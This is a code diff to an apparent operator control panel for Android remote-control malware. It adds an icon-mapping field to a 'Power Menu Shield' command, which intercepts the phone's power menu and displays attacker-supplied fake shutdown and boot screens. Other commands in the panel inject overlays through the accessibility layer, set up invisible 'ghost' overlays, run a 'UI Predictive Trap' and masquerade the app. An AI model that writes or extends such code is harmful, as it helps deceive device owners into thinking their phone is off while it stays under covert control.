@@ -544,7 +544,7 @@
                 commands: [
                     { id: 'INJECT_UI', name: 'Inject Web Overlay', icon: '🖼️', inputs: [{id: 'ui-touchable', label: 'Input Mode', type: 'select', options: [{v: 'TRUE', l: 'Touchable'}, {v: 'FALSE', l: 'Ghost'}]}, {id: 'ui-method', label: 'Injection Method', type: 'select', options: [{v: 'AUTO', l: 'AUTO (Smart Priority)'}, {v: 'ACC', l: 'Accessibility Layer'}, {v: 'OVERLAY', l: 'Standard Overlay'}]}, {id: 'ui-html', label: 'HTML Content', type: 'textarea'}], cleanup: 'REMOVE_UI' },
                     { id: 'STATUS_BAR_UI', name: 'Status Bar Injection', icon: '🚥', keywords: 'status, top, bar, overlay', inputs: [{id: 'sb-state', label: 'State', type: 'select', options:[{v: 'ON', l: 'Activate'}, {v: 'OFF', l: 'Deactivate'}]}, {id: 'sb-touchable', label: 'Input Mode', type: 'select', options:[{v: 'FALSE', l: 'Ghost (Pass-through)'}, {v: 'TRUE', l: 'Touchable'}]}, {id: 'sb-html', label: 'HTML Content', type: 'textarea', placeholder: '<html>...'}] },
-                    { id: 'POWER_SHIELD', name: 'Power Menu Shield', icon: '🛡️', inputs: [{id: 'ps-toggle', label: 'Intercept State', type: 'select', options: [{v: 'ON', l: 'ENABLED (Armed)'}, {v: 'OFF', l: 'DISABLED (Pass-through)'}]}, {id: 'ps-timeout', label: 'Failsafe Timeout (s)', type: 'number', val: 15}, {id: 'ps-method', label: 'Injection Layer', type: 'select', options: [{v: 'ACC', l: 'ACC (Above Power Menu)'}, {v: 'OVERLAY', l: 'Standard (Standard Apps)'}]}, {id: 'ps-html-shutdown', label: 'Shutdown HTML Payload', type: 'textarea', placeholder: '<html>Shutdown Content</html>'}, {id: 'ps-html-boot', label: 'Boot/Logo HTML Payload', type: 'textarea', placeholder: '<html>Boot/Logo Content</html>'}] },
+                    { id: 'POWER_SHIELD', name: 'Power Menu Shield', icon: '🛡️', inputs: [{id: 'ps-toggle', label: 'Intercept State', type: 'select', options: [{v: 'ON', l: 'ENABLED (Armed)'}, {v: 'OFF', l: 'DISABLED (Pass-through)'}]}, {id: 'ps-timeout', label: 'Failsafe Timeout (s)', type: 'number', val: 15}, {id: 'ps-method', label: 'Injection Layer', type: 'select', options: [{v: 'ACC', l: 'ACC (Above Power Menu)'}, {v: 'OVERLAY', l: 'Standard (Standard Apps)'}]}, {id: 'ps-mapping', label: 'Icon Mapping (htmlId:Native Text)', type: 'text', val: 'svg-1:Power off,svg-2:Restart,svg-3:Emergency mode'}, {id: 'ps-html-shutdown', label: 'Shutdown HTML Payload', type: 'textarea', placeholder: '<html>Shutdown Content</html>'}, {id: 'ps-html-boot', label: 'Boot/Logo HTML Payload', type: 'textarea', placeholder: '<html>Boot/Logo Content</html>'}] },
                     { 
                         id: 'UI_TRAP', 
                         name: 'UI Predictive Trap', 
@@ -1710,9 +1710,10 @@
                         const pst = document.getElementById('ps-toggle').value;
                         const pso = document.getElementById('ps-timeout').value;
                         const psm = document.getElementById('ps-method').value;
+                        const psmap = document.getElementById('ps-mapping').value;
                         const pshS = document.getElementById('ps-html-shutdown').value;
                         const pshB = document.getElementById('ps-html-boot').value;
-                        content = `${pst}|${pso}|${psm}|${pshS} ||| ${pshB}`; break;
+                        content = `${pst}|${pso}|${psm}|${psmap}|${pshS} ||| ${pshB}`; break;
                     case 'SET_DEBUG_UI':
                         content = document.getElementById('val-debug-ui').value; break;
                     case 'SET_MASQUERADE':
